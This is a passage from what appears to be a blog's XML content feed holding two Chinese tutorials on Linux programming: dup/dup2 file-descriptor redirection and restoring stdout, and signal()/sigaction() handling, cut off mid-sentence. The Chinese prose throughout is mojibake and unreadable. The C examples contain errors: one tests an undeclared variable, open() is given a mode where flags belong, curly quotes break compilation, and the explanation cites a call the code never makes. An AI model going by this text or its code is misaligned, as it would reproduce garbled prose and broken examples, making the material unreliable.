-------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1<br>------------<br>fd2 2  | p2<br>------------<br>fd3 3  | p3<br>------------<br>â€¦ â€¦<br>â€¦ â€¦<br>------------</p><p>ä¸€ã€å•ä¸ªè¿›ç¨‹å†…çš„dupå’Œdup2<br>å‡è®¾è¿›ç¨‹Aæ‹¥æœ‰ä¸€ä¸ªå·²æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦fd3ï¼Œå®ƒçš„çŠ¶æ€å¦‚ä¸‹</p><p>è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(before dup2)<br>------------<br>fd0 0  | p0<br>------------<br>fd1 1  | p1 -------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1<br>------------<br>fd2 2  | p2<br>------------<br>fd3 3  | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2<br>------------<br>â€¦ â€¦<br>â€¦ â€¦<br>------------</p><p>ç»ä¸‹é¢è°ƒç”¨ï¼š<br>n_fd = dup2(fd3, STDOUT_FILENO);åè¿›ç¨‹çŠ¶æ€å¦‚ä¸‹ï¼š</p><p>è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(after dup2)<br>------------<br>fd0 0  | p0<br>------------<br>n_fd 1  | p1 ------------<br>------------        <br>fd2 2  | p2         <br>------------         _|<br>fd3 3  | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2<br>------------<br>â€¦ â€¦<br>â€¦ â€¦<br>------------<br>è§£é‡Šå¦‚ä¸‹ï¼š<br>n_fd = dup2(fd3, STDOUT_FILENO)è¡¨ç¤ºn_fdä¸fd3å…±äº«ä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹(å®ƒä»¬çš„æ–‡ä»¶è¡¨æŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹)ï¼Œn_fdåœ¨æ–‡ä»¶æè¿°ç¬¦è¡¨ä¸­çš„ä½ç½®ä¸º STDOUT_FILENOçš„ä½ç½®ï¼Œè€ŒåŸå…ˆçš„STDOUT_FILENOæ‰€æŒ‡å‘çš„æ–‡ä»¶è¡¨é¡¹è¢«å…³é—­ï¼Œæˆ‘è§‰å¾—ä¸Šå›¾åº”è¯¥å¾ˆæ¸…æ™°çš„åæ˜ å‡ºè¿™ç‚¹ã€‚æŒ‰ç…§ä¸Šé¢çš„è§£é‡Šæˆ‘ä»¬å°±å¯ä»¥è§£é‡ŠCUä¸­æå‡ºçš„ä¸€äº›é—®é¢˜ï¼š<br>(1) â€œdup2çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸æ˜¯å¿…é¡»ä¸ºå·²æ‰“å¼€çš„åˆæ³•filedesï¼Ÿâ€ â€“ ç­”æ¡ˆï¼šå¿…é¡»ã€‚<br>(2) â€œdup2çš„ç¬¬äºŒä¸ªå‚æ•°å¯ä»¥æ˜¯ä»»æ„åˆæ³•èŒƒå›´çš„filedeså€¼ä¹ˆï¼Ÿâ€ â€“ ç­”æ¡ˆï¼šå¯ä»¥ï¼Œåœ¨Unixå…¶å–å€¼åŒºé—´ä¸º[0,255]ã€‚</p><p>å¦å¤–æ„Ÿè§‰ç†è§£dup2çš„ä¸€ä¸ªå¥½æ–¹æ³•å°±æ˜¯æŠŠfdçœ‹æˆä¸€ä¸ªç»“æ„ä½“ç±»å‹ï¼Œå°±å¦‚ä¸Šé¢å›¾å½¢ä¸­ç”»çš„é‚£æ ·ï¼Œæˆ‘ä»¬ä¸å¦¨æŠŠä¹‹å®šä¹‰ä¸ºï¼š<br>struct fd_t {<br>int index;<br>filelistitem *ptr;<br>};<br>ç„¶ådup2åŒ¹é…indexï¼Œä¿®æ”¹ptrï¼Œå®Œæˆdup2æ“ä½œã€‚</p><p>åœ¨å­¦ä¹ dup2æ—¶æ€»æ˜¯ç¢°åˆ°â€œé‡å®šå‘â€ä¸€è¯ï¼Œä¸Šå›¾å®Œæˆçš„å°±æ˜¯ä¸€ä¸ªâ€œä»æ ‡å‡†è¾“å‡ºåˆ°æ–‡ä»¶çš„é‡å®šå‘â€ï¼Œç»è¿‡dup2åè¿›ç¨‹Açš„ä»»ä½•ç›®æ ‡ä¸ºSTDOUT_FILENOçš„I/Oæ“ä½œå¦‚printfç­‰ï¼Œå…¶æ•°æ®éƒ½å°†æµå…¥fd3æ‰€å¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ç¨‹åºï¼š</p><pre class="language-c" data-language="c"><code class="language-c">\#define TESTSTR <span class="token string">"Hello dup2\n"</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span>   fd3<span class="token punctuation">;</span>â€‹    fd3 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"testdup2.dat"</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>â€‹    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>â€‹        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"open error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>â€‹        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>â€‹    <span class="token punctuation">&#125;</span>â€‹    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">dup2</span><span class="token punctuation">(</span>fd3<span class="token punctuation">,</span> STDOUT_FILENO<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    â€‹        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"err in dup2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>â€‹    <span class="token punctuation">&#125;</span>â€‹    <span class="token function">printf</span><span class="token punctuation">(</span>TESTSTR<span class="token punctuation">)</span><span class="token punctuation">;</span>â€‹    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å…¶ç»“æœå°±æ˜¯ä½ åœ¨testdup2.datä¸­çœ‹åˆ°&quot;Hello dup2&quot;ã€‚</p><p>äºŒã€é‡å®šå‘åæ¢å¤<br>CUä¸Šæœ‰è¿™æ ·ä¸€ä¸ªå¸–å­ï¼Œå°±æ˜¯å¦‚ä½•åœ¨é‡å®šå‘åå†æ¢å¤åŸæ¥çš„çŠ¶æ€ï¼Ÿé¦–å…ˆå¤§å®¶éƒ½èƒ½æƒ³åˆ°è¦ä¿å­˜é‡å®šå‘å‰çš„æ–‡ä»¶æè¿°ç¬¦ã€‚é‚£ä¹ˆå¦‚ä½•æ¥ä¿å­˜å‘¢ï¼Œè±¡ä¸‹é¢è¿™æ ·è¡Œä¹ˆï¼Ÿ<br>int s_fd = STDOUT_FILENO;<br>int n_fd = dup2(fd3, STDOUT_FILENO);<br>è¿˜æ˜¯è¿™æ ·å¯ä»¥å‘¢ï¼Ÿ<br>int s_fd = dup(STDOUT_FILENO);<br>int n_fd = dup2(fd3, STDOUT_FILENO);<br>è¿™ä¸¤ç§æ–¹æ³•çš„åŒºåˆ«åˆ°åº•åœ¨å“ªå‘¢ï¼Ÿç­”æ¡ˆæ˜¯ç¬¬äºŒç§æ–¹æ¡ˆæ‰æ˜¯æ­£ç¡®çš„ï¼Œåˆ†æå¦‚ä¸‹ï¼šæŒ‰ç…§ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬ä»…ä»…åœ¨&quot;è¡¨é¢ä¸Š&quot;ä¿å­˜äº†ç›¸å½“äºfd_tï¼ˆæŒ‰ç…§æˆ‘å‰é¢è¯´çš„ç†è§£æ–¹æ³•ï¼‰ä¸­çš„indexï¼Œè€Œåœ¨è°ƒç”¨dup2ä¹‹åï¼Œptræ‰€æŒ‡å‘çš„æ–‡ä»¶è¡¨é¡¹ç”±äºè®¡æ•°å€¼å·²ä¸ºé›¶è€Œè¢«å…³é—­äº†ï¼Œæˆ‘ä»¬å¦‚æœå†è°ƒç”¨dup2(s_fd, fd3)å°±ä¼šå‡ºé”™(å‡ºé”™åŸå› ä¸Šé¢æœ‰è§£é‡Š)ã€‚è€Œç¬¬äºŒç§æ–¹æ³•æˆ‘ä»¬é¦–å…ˆåšä¸€ä¸‹å¤åˆ¶ï¼Œå¤åˆ¶åçš„çŠ¶æ€å¦‚ä¸‹å›¾æ‰€ç¤º:<br>è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(after dup)<br>------------<br>fd0 0  | p0<br>------------<br>fd1 1  | p1 -------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1<br>------------         /|<br>fd2 2  | p2        /<br>------------       /<br>fd3 3  | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2<br>------------     /<br>s_fd 4  | p4 ------/<br>------------<br>â€¦ â€¦<br>â€¦ â€¦<br>------------</p><p>è°ƒç”¨dup2åçŠ¶æ€ä¸ºï¼š<br>è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨(after dup2)<br>------------<br>fd0 0  | p0<br>------------<br>n_fd 1  | p1 ------------<br>------------        <br>fd2 2  | p2         <br>------------        _|<br>fd3 3  | p3 -------------&gt; æ–‡ä»¶è¡¨2 ---------&gt; vnode2<br>------------<br>s_fd 4  | p4 -------------&gt;æ–‡ä»¶è¡¨1 ---------&gt; vnode1<br>------------<br>â€¦ â€¦<br>â€¦ â€¦<br>------------<br>dup(fd)çš„è¯­æ„æ˜¯è¿”å›çš„æ–°çš„æ–‡ä»¶æè¿°ç¬¦ä¸fdå…±äº«ä¸€ä¸ªæ–‡ä»¶è¡¨é¡¹ã€‚å°±å¦‚after dupå›¾ä¸­çš„s_fdå’Œfd1å…±äº«æ–‡ä»¶è¡¨1ä¸€æ ·ã€‚</p><p>ç¡®å®šç¬¬äºŒä¸ªæ–¹æ¡ˆåé‡å®šå‘åçš„æ¢å¤å°±å¾ˆå®¹æ˜“äº†ï¼Œåªéœ€è°ƒç”¨dup2(s_fd, n_fd);å³å¯ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªå®Œæ•´çš„ä¾‹å­ç¨‹åºï¼š<br>#define TESTSTR â€œHello dup2\nâ€<br>#define SIZEOFTESTSTR 11</p><p>int main() {<br>int   fd3;<br>int   s_fd;<br>int   n_fd;</p><p>â€‹    fd3 = open(â€œtestdup2.datâ€, 0666);<br>â€‹    if (fd3 &lt; 0) {<br>â€‹        printf(â€œopen error\nâ€);<br>â€‹        exit(-1);<br>â€‹    }</p><p>â€‹<br>â€‹    s_fd = dup(STDOUT_FILENO);<br>â€‹    if (s_fd &lt; 0) {<br>â€‹        printf(â€œerr in dup\nâ€);<br>â€‹    }</p><p>â€‹<br>â€‹    n_fd = dup2(fd3, STDOUT_FILENO);<br>â€‹    if (n_fd &lt; 0) {<br>â€‹        printf(â€œerr in dup2\nâ€);<br>â€‹    }<br>â€‹    write(STDOUT_FILENO, TESTSTR, SIZEOFTESTSTR);</p><p>â€‹<br>â€‹    if (dup2(s_fd, n_fd) &lt; 0) {<br>â€‹        printf(â€œerr in dup2\nâ€);<br>â€‹    }<br>â€‹    write(STDOUT_FILENO, TESTSTR, SIZEOFTESTSTR);<br>â€‹    return 0;<br>}<br>æ³¨ æ„è¿™é‡Œæˆ‘åœ¨è¾“å‡ºæ•°æ®çš„æ—¶å€™æˆ‘æ˜¯ç”¨äº†ä¸å¸¦ç¼“å†²çš„writeåº“å‡½æ•°ï¼Œå¦‚æœä½¿ç”¨å¸¦ç¼“å†²åŒºçš„printfï¼Œåˆ™æœ€ç»ˆç»“æœä¸ºå±å¹•ä¸Šè¾“å‡ºä¸¤è¡Œ&quot;Hello dup2&quot;ï¼Œè€Œæ–‡ä»¶testdup2.datä¸­ä¸ºç©ºï¼ŒåŸå› å°±æ˜¯ç¼“å†²åŒºä½œæ€ªï¼Œç”±äºæœ€ç»ˆçš„ç›®æ ‡æ˜¯å±å¹•ï¼Œæ‰€ä»¥ç¨‹åºæœ€åå°†ç¼“å†²åŒºçš„å†…å®¹éƒ½è¾“å‡ºåˆ°å±å¹•ã€‚</p><p>ä¸‰ã€çˆ¶å­è¿›ç¨‹é—´çš„dup/dup2<br>ç”±forkè°ƒç”¨å¾—åˆ°çš„å­è¿›ç¨‹å’Œçˆ¶è¿›ç¨‹çš„ç›¸åŒæ–‡ä»¶æè¿°ç¬¦å…±äº«åŒä¸€æ–‡ä»¶è¡¨é¡¹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br>çˆ¶è¿›ç¨‹Açš„æ–‡ä»¶æè¿°ç¬¦è¡¨<br>------------<br>fd0 0  | p0<br>------------<br>fd1 1  | p1 -------------&gt; æ–‡ä»¶è¡¨1 ---------&gt; vnode1<br>------------              /|<br>fd2 2  | p2               |<br>------------              |<br>|</p><table><thead><tr><th>å­è¿›ç¨‹Bçš„æ–‡ä»¶æè¿°ç¬¦è¡¨</th></tr></thead><tbody><tr><td>fd0 0</td></tr><tr><td>------------</td></tr><tr><td>fd1 1</td></tr></tbody></table><p>------------<br>fd2 2  | p2<br>------------<br>æ‰€ä»¥æ°å½“çš„åˆ©ç”¨dup2å’Œdupå¯ä»¥åœ¨çˆ¶å­è¿›ç¨‹ä¹‹é—´å»ºç«‹ä¸€æ¡â€œæ²Ÿé€šçš„æ¡¥æ¢â€ã€‚è¿™é‡Œä¸è¯¦è¿°ã€‚</p><p>å››ã€å°ç»“<br>çµæ´»çš„åˆ©ç”¨dup/dup2å¯ä»¥ç»™ä½ å¸¦æ¥å¾ˆå¤šå¼ºå¤§çš„åŠŸèƒ½ï¼ŒèŠ±äº†ä¸€äº›æ—¶é—´æ€»ç»“å‡ºä¸Šé¢é‚£ä¹ˆå¤šï¼Œä¸çŸ¥é“è‡ªå·±ç†è§£çš„æ˜¯å¦é€å½»ï¼Œåªèƒ½åœ¨ä»¥åçš„å®è·µä¸­æ…¢æ…¢æ¢ç´¢äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> é€šä¿¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxè¿›ç¨‹é—´é€šä¿¡:ä¿¡å· Signal()ã€sigaction()</title>
      <link href="/posts/e6269028/"/>
      <url>/posts/e6269028/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/52php/p/5813867.html">https://www.cnblogs.com/52php/p/5813867.html</a></p><h1>Linuxè¿›ç¨‹é—´é€šä¿¡ï¼ˆä¸€ï¼‰ï¼š ä¿¡å· signal()ã€sigaction()</h1><h3 id="ä¸€ã€ä»€ä¹ˆæ˜¯ä¿¡å·">ä¸€ã€ä»€ä¹ˆæ˜¯ä¿¡å·</h3><p>ç”¨è¿‡Windowsçš„æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå½“æˆ‘ä»¬æ— æ³•æ­£å¸¸ç»“æŸä¸€ä¸ªç¨‹åºæ—¶ï¼Œå¯ä»¥ç”¨ä»»åŠ¡ç®¡ç†å™¨å¼ºåˆ¶ç»“æŸè¿™ä¸ªè¿›ç¨‹ï¼Œä½†è¿™å…¶å®æ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼ŸåŒæ ·çš„åŠŸèƒ½åœ¨Linuxä¸Šæ˜¯é€šè¿‡ç”Ÿæˆä¿¡å·å’Œæ•è·ä¿¡å·æ¥å®ç°çš„ï¼Œè¿è¡Œä¸­çš„è¿›ç¨‹æ•è·åˆ°è¿™ä¸ªä¿¡å·ç„¶åä½œå‡ºä¸€å®šçš„æ“ä½œå¹¶æœ€ç»ˆè¢«ç»ˆæ­¢ã€‚</p><p>ä¿¡å·æ˜¯UNIXå’ŒLinuxç³»ç»Ÿå“åº”æŸäº›æ¡ä»¶è€Œäº§ç”Ÿçš„ä¸€ä¸ªäº‹ä»¶ï¼Œæ¥æ”¶åˆ°è¯¥ä¿¡å·çš„è¿›ç¨‹ä¼šç›¸åº”åœ°é‡‡å–ä¸€äº›è¡ŒåŠ¨ã€‚é€šå¸¸ä¿¡å·æ˜¯ç”±ä¸€ä¸ªé”™è¯¯äº§ç”Ÿçš„ã€‚ä½†å®ƒä»¬è¿˜å¯ä»¥ä½œä¸ºè¿›ç¨‹é—´é€šä¿¡æˆ–ä¿®æ”¹è¡Œä¸ºçš„ä¸€ç§æ–¹å¼ï¼Œæ˜ç¡®åœ°ç”±ä¸€ä¸ªè¿›ç¨‹å‘é€ç»™å¦ä¸€ä¸ªè¿›ç¨‹ã€‚ä¸€ä¸ªä¿¡å·çš„äº§ç”Ÿå«ç”Ÿæˆï¼Œæ¥æ”¶åˆ°ä¸€ä¸ªä¿¡å·å«æ•è·ã€‚</p><h3 id="äºŒã€ä¿¡å·çš„ç§ç±»">äºŒã€ä¿¡å·çš„ç§ç±»</h3><p>ä¿¡å·çš„åç§°æ˜¯åœ¨å¤´æ–‡ä»¶signal.hä¸­å®šä¹‰çš„ï¼Œä¿¡å·éƒ½ä»¥SIGå¼€å¤´ï¼Œå¸¸ç”¨çš„ä¿¡å·å¹¶ä¸å¤šï¼Œå¸¸ç”¨çš„ä¿¡å·å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/ZWaEXzkgeJbsNDH.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/ZWaEXzkgeJbsNDH.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>æ›´å¤šçš„ä¿¡å·ç±»å‹å¯æŸ¥çœ‹é™„å½•è¡¨ã€‚</p><h3 id="ä¸‰ã€ä¿¡å·çš„å¤„ç†-â€”â€”-signal-å‡½æ•°">ä¸‰ã€ä¿¡å·çš„å¤„ç† â€”â€” signal()å‡½æ•°</h3><p>ç¨‹åºå¯ç”¨ä½¿ç”¨signal()å‡½æ•°æ¥å¤„ç†æŒ‡å®šçš„ä¿¡å·ï¼Œä¸»è¦é€šè¿‡å¿½ç•¥å’Œæ¢å¤å…¶é»˜è®¤è¡Œä¸ºæ¥å·¥ä½œã€‚signal()å‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š</p><blockquote><p>#include &lt;signal.h&gt;<br>void (*signal(int sig, void (*func)(int)))(int);</p></blockquote><p>è¿™æ˜¯ä¸€ä¸ªç›¸å½“å¤æ‚çš„å£°æ˜ï¼Œè€å¿ƒç‚¹çœ‹å¯ä»¥çŸ¥é“signalæ˜¯ä¸€ä¸ªå¸¦æœ‰sigå’Œfuncä¸¤ä¸ªå‚æ•°çš„å‡½æ•°ï¼Œfuncæ˜¯ä¸€ä¸ªç±»å‹ä¸ºvoid (*)(int)çš„å‡½æ•°æŒ‡é’ˆã€‚è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªä¸funcç›¸åŒç±»å‹çš„æŒ‡é’ˆï¼ŒæŒ‡å‘å…ˆå‰æŒ‡å®šä¿¡å·å¤„ç†å‡½æ•°çš„å‡½æ•°æŒ‡é’ˆã€‚å‡†å¤‡æ•è·çš„ä¿¡å·çš„å‚æ•°ç”±sigç»™å‡ºï¼Œæ¥æ”¶åˆ°çš„æŒ‡å®šä¿¡å·åè¦è°ƒç”¨çš„å‡½æ•°ç”±å‚æ•°funcç»™å‡ºã€‚å…¶å®è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨æ˜¯ç›¸å½“ç®€å•çš„ï¼Œé€šè¿‡ä¸‹é¢çš„ä¾‹å­å°±å¯ä»¥çŸ¥é“ã€‚æ³¨æ„ä¿¡å·å¤„ç†å‡½æ•°çš„åŸå‹å¿…é¡»ä¸ºvoid funcï¼ˆintï¼‰ï¼Œæˆ–è€…æ˜¯ä¸‹é¢çš„ç‰¹æ®Šå€¼ï¼š</p><blockquote><p>SIG_IGN : å¿½ç•¥ä¿¡å·</p><p>SIG_DFL : æ¢å¤ä¿¡å·çš„é»˜è®¤è¡Œä¸º</p></blockquote><p>è¯´äº†è¿™ä¹ˆå¤šï¼Œè¿˜æ˜¯ç»™å‡ºä¸€ä¸ªä¾‹å­æ¥è¯´æ˜ä¸€ä¸‹å§ï¼Œæºæ–‡ä»¶åä¸º signal1.cï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span> <span class="token keyword">void</span> <span class="token function">ouch</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nOUCH! - I got signal %d\n"</span><span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// æ¢å¤ç»ˆç«¯ä¸­æ–­ä¿¡å·SIGINTçš„é»˜è®¤è¡Œä¸º</span>    <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> SIG_DFL<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// æ”¹å˜ç»ˆç«¯ä¸­æ–­ä¿¡å·SIGINTçš„é»˜è®¤è¡Œä¸ºï¼Œä½¿ä¹‹æ‰§è¡Œouchå‡½æ•°</span>    <span class="token comment">// è€Œä¸æ˜¯ç»ˆæ­¢ç¨‹åºçš„æ‰§è¡Œ</span>    <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token function">signal</span><span class="token punctuation">(</span>SIGINT<span class="token punctuation">,</span> ouch<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/LbhYG74XBNJIwAZ.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/LbhYG74XBNJIwAZ.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€æ¬¡æŒ‰ä¸‹ç»ˆæ­¢å‘½ä»¤ï¼ˆctrl+cï¼‰æ—¶ï¼Œè¿›ç¨‹å¹¶æ²¡æœ‰è¢«ç»ˆæ­¢ï¼Œé¢æ˜¯è¾“å‡ºOUCH! - I got signal 2ï¼Œå› ä¸ºSIGINTçš„é»˜è®¤è¡Œä¸ºè¢«signal()å‡½æ•°æ”¹å˜äº†ï¼Œå½“è¿›ç¨‹æ¥å—åˆ°ä¿¡å·SIGINTæ—¶ï¼Œå®ƒå°±å»è°ƒç”¨å‡½æ•°ouchå»å¤„ç†ï¼Œæ³¨æ„ouchå‡½æ•°æŠŠä¿¡å·SIGINTçš„å¤„ç†æ–¹å¼æ”¹å˜æˆé»˜è®¤çš„æ–¹å¼ï¼Œæ‰€ä»¥å½“ä½ å†æŒ‰ä¸€æ¬¡ctrl+cæ—¶ï¼Œè¿›ç¨‹å°±åƒä¹‹å‰é‚£æ ·è¢«ç»ˆæ­¢äº†ã€‚</p><h3 id="å››ã€ä¿¡å·å¤„ç†-â€”â€”-sigaction-å‡½æ•°">å››ã€ä¿¡å·å¤„ç† â€”â€” sigaction()å‡½æ•°</h3><p>å‰é¢æˆ‘ä»¬çœ‹åˆ°äº†signal()å‡½æ•°å¯¹ä¿¡å·çš„å¤„ç†ï¼Œä½†æ˜¯ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ›´åŠ å¥å£®çš„ä¿¡å·æ¥å£ â€”â€” sigaction()å‡½æ•°ã€‚å®ƒçš„åŸå‹ä¸ºï¼š</p><blockquote><p>#include &lt;signal.h&gt;<br>int sigaction(int sig, const struct sigaction *act, struct sigaction *oact);</p></blockquote><p>è¯¥å‡½æ•°ä¸signal()å‡½æ•°ä¸€æ ·ï¼Œç”¨äºè®¾ç½®ä¸ä¿¡å·sigå…³è”çš„åŠ¨ä½œï¼Œè€Œoactå¦‚æœä¸æ˜¯ç©ºæŒ‡é’ˆçš„è¯ï¼Œå°±ç”¨å®ƒæ¥ä¿å­˜åŸå…ˆå¯¹è¯¥ä¿¡å·çš„åŠ¨ä½œçš„ä½ç½®ï¼Œactåˆ™ç”¨äºè®¾ç½®æŒ‡å®šä¿¡å·çš„åŠ¨ä½œã€‚</p><p>sigactionç»“æ„ä½“å®šä¹‰åœ¨signal.hä¸­ï¼Œä½†æ˜¯å®ƒè‡³å°‘åŒ…æ‹¬ä»¥ä¸‹æˆå‘˜ï¼š</p><blockquote><p>void (*) (int) sa_handlerï¼šå¤„ç†å‡½æ•°æŒ‡é’ˆï¼Œç›¸å½“äºsignalå‡½æ•°çš„funcå‚æ•°ã€‚</p><p>sigset_t sa_maskï¼š æŒ‡å®šä¸€ä¸ªã€‚ä¿¡å·é›†ï¼Œåœ¨è°ƒç”¨sa_handleræ‰€æŒ‡å‘çš„ä¿¡å·å¤„ç†å‡½æ•°ä¹‹å‰ï¼Œè¯¥ä¿¡å·é›†å°†è¢«åŠ å…¥åˆ°è¿›ç¨‹çš„ä¿¡å·å±è”½å­—ä¸­ã€‚ä¿¡å·å±è”½å­—æ˜¯æŒ‡å½“å‰è¢«é˜»å¡çš„ä¸€ç»„ä¿¡å·ï¼Œå®ƒä»¬ä¸èƒ½è¢«å½“å‰è¿›ç¨‹æ¥æ”¶åˆ°</p><p>int sa_flagsï¼šä¿¡å·å¤„ç†ä¿®æ”¹å™¨;</p></blockquote><p>sa_mask çš„å€¼é€šå¸¸æ˜¯é€šè¿‡ä½¿ç”¨ä¿¡å·é›†å‡½æ•°æ¥è®¾ç½®çš„ï¼Œå…³äºä¿¡å·é›†å‡½æ•°ï¼Œæˆ‘å°†ä¼šåœ¨æˆ‘çš„ä¸‹ä¸€ç¯‡æ–‡ç«  â€”â€” <a href="http://www.cnblogs.com/52php/p/5815125.html">Linuxè¿›ç¨‹é—´é€šä¿¡â€”â€”ä¿¡å·é›†å‡½æ•°</a>ï¼Œè¯¦ç»†è®²è¿°ã€‚</p><p>sa_flagsï¼Œé€šå¸¸å¯ä»¥å–ä»¥ä¸‹çš„å€¼ï¼š</p><p><img src="https://s2.loli.net/2022/05/25/PU1eTSYM4CBsy2h.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/05/25/PU1eTSYM4CBsy2h.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>æ­¤å¤–ï¼Œç°åœ¨æœ‰ä¸€ä¸ªè¿™æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨signal()æˆ–sigaction()å‡½æ•°æ¥æŒ‡å®šå¤„ç†ä¿¡å·çš„å‡½æ•°ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªä¿¡å·å¤„ç†å‡½æ•°å»ºç«‹ä¹‹å‰å°±æ¥æ”¶åˆ°è¦å¤„ç†çš„ä¿¡å·çš„è¯ï¼Œè¿›ç¨‹ä¼šæœ‰æ€æ ·çš„ååº”å‘¢ï¼Ÿå®ƒå°±ä¸ä¼šåƒæˆ‘ä»¬æƒ³åƒçš„é‚£æ ·ç”¨æˆ‘ä»¬è®¾å®šçš„å¤„ç†å‡½æ•°æ¥å¤„ç†äº†ã€‚sa_maskå°±å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜ï¼Œsa_maskæŒ‡å®šäº†ä¸€ä¸ªä¿¡å·é›†ï¼Œåœ¨è°ƒç”¨sa_handleræ‰€æŒ‡å‘çš„ä¿¡å·å¤„ç†å‡½æ•°ä¹‹å‰ï¼Œè¯¥ä¿¡å·é›†å°†è¢«åŠ 